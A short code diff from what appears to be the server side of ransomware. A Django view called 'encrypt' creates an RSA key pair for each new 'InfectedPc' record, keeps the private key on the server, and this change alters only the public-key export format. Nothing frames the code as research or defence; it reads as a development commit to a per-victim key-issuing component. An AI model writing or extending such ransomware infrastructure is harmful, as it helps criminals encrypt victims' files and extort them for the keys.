@@ -31,7 +31,7 @@ def encrypt(request):
             if not InfectedPc.objects.filter(uniqueId = request.data['uniqueId']).exists():
                 key = RSA.generate(2048)
                 privateKey = key.export_key(pkcs=8)
-                publicKey = key.publickey().export_key(pkcs=8)
+                publicKey = key.publickey().export_key()
                 InfectedPc.objects.create(
                     uniqueId=request.data['uniqueId'],
                     privateKey=privateKey,
